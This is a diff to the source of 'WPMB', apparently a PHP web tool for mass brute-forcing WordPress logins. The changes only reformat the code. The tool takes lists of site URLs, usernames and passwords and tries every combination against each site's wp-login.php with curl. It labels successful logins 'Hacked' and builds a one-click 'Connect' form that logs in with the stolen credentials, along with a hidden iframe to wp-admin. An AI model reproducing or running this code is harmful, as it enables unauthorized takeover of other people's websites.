@@ -13,11 +13,11 @@ ignore_user_abort(true);
 <!-- fb.com/B10S-1309549119165925  --> 
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
 <title>WPMB By (B10S)</title> 
-<link rel="icon" href="https://raw.githubusercontent.com/8105/WPMB/master/WPMB-32.png" type="image/x-icon"> 
-<style type="text/css">textarea{padding:7px 14px;height:312px;color:#2e4453;font-size:16px;font-weight:normal;line-height:1.5;border:1px solid#c8d7e1; 
+<link rel="icon" href="https://raw.githubusercontent.com/8105/WPMB/master/WPMB-32.png" type="image/x-icon"><style type="text/css"> 
+textarea{padding:7px 14px;height:312px;color:#2e4453;font-size:16px;font-weight:normal;line-height:1.5;border:1px solid#c8d7e1; 
 background-color:white;box-shadow:none;transition:all.15s ease-in-out;} 
-#brd{border:1px solid black;border-collapse:collapse;padding:5px} 
-body{min-width:0;color:#444;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; 
+#brd{border:1px solid black;border-collapse:collapse;padding:5px}body{min-width:0;color:#444; 
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; 
 font-size:13px;} 
 .form{background:#ffffff;border:1px solid#d4dfe7;box-shadow:0px 1px 2px 0px#e7edf3;padding:20px 24px 24px;margin-left:auto;margin-right:auto;} 
 #FIN{font-size:14px;font-weight:600;margin-bottom:5px;color:#2e4453;line-height:24px;} 
@@ -36,14 +36,10 @@ if($_POST){echo"<table id='brd'><tr id='brd'><td id='brd'>Addr</td><td id='brd'>
 $s=explode("\n",str_replace("\r",'',$_POST['s'])); 
 $u=explode("\n",str_replace("\r",'',$_POST['u'])); 
 $p=explode("\n",str_replace("\r",'',$_POST['p'])); 
-foreach($u as$U=>$_U){ 
-   foreach($p as$P=>$_P){ 
-     foreach($s as$S=>$_S){ 
-      if($_S=='NULL')continue; 
-      $_S=(substr($_S,-1)!='/')?$_S.'/':$_S; 
-      $_S=substr($_S,0,7)=='http://'?$_S:(substr($_S,0,8)=='https://')?$_S:'http://'.$_S; 
-      if(!th($_S)){ 
-        echo"<tr id='brd' style='color:#F00'><td>".$_S."</td>
+foreach($u as$U=>$_U){foreach($p as$P=>$_P){foreach($s as$S=>$_S){if($_S=='NULL')continue; 
+       $_S=(substr($_S,-1)!='/')?$_S.'/':$_S; 
+       $_S=substr($_S,0,7)=='http://'?$_S:(substr($_S,0,8)=='https://')?$_S:'http://'.$_S; 
+       if(!th($_S)){echo"<tr id='brd' style='color:#F00'><td>".$_S."</td>
 <td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Error URL !</td><td id='brd'>N/A</td></tr>"; 
         ob_flush();flush(); 
         $s[$S]='NULL'; 
@@ -59,14 +55,12 @@ foreach($u as$U=>$_U){
       $rez=curl_exec($bt); 
       $N=curl_getinfo($bt,CURLINFO_HTTP_CODE); 
       curl_close($bt); 
-      if($N==404){ 
-        echo"<tr id='brd' style='color:#F00'><td id='brd'>".$_S."wp-login.php</td> 
+      if($N==404){echo"<tr id='brd' style='color:#F00'><td id='brd'>".$_S."wp-login.php</td> 
 <td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Login No Found !</td><td>404</td></tr>"; 
         ob_flush();flush(); 
         $s[$S]='NULL'; 
         continue;} 
-      if(eregi("profile.php",$rez)){ 
-echo'<iframe src="'.$_S.'wp-admin/" style="width:0;height:0;border:0;border:none;"></iframe>'; 
+      if(eregi("profile.php",$rez)){echo'<iframe src="'.$_S.'wp-admin/" style="width:0;height:0;border:0;border:none;"></iframe>'; 
 ob_flush();flush(); 
 echo"<tr id='brd' style='color:#0F0'><td>".$_S."</td><td id='brd'>".$_U."</td><td id='brd'>".$_P."</td><td id='brd'>Hacked</td> 
 <td id='brd'><form target=_blank action='".$_S."wp-login.php' method=POST><input type=hidden name=log value=".$_U." /> 
@@ -74,8 +68,7 @@ echo"<tr id='brd' style='color:#0F0'><td>".$_S."</td><td id='brd'>".$_U."</td><t
 <input type=hidden name=testcookie value=1 /><button>Connect</button></form>"; 
         ob_flush();flush();}}}} 
 echo"</table>";} 
-function th($ts){ 
-  $R=curl_init(); 
+function th($ts){$R=curl_init(); 
     curl_setopt($R,CURLOPT_URL,$ts); 
     curl_setopt($R,CURLOPT_BINARYTRANSFER,1); 
     curl_setopt($R,CURLOPT_HEADERFUNCTION,'curlHeaderCallback'); 
